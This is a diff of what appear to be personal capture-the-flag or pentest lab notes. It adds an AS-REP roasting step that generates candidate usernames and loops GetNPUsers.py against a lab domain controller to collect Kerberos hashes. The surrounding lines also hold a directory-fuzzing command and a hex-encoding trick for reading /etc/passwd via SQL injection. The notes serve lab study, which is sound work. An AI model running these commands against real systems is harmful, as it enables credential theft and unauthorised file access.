@@ -16,6 +16,15 @@ ffuf
 ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
 python crawl.py results.txt
 
+foothold
+ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication.
+https://github.com/urbanadventurer/username-anarchy
+./username-anarchy --input-file fullnames.txt --select-format
+first,flast,first.last,firstl > unames.txt
+while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -
+dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
+
+
 convert to sql_En
 printf 0x; printf "/etc/passwd" | xxd -ps -c 200 | tr -d '\n'; echo
 
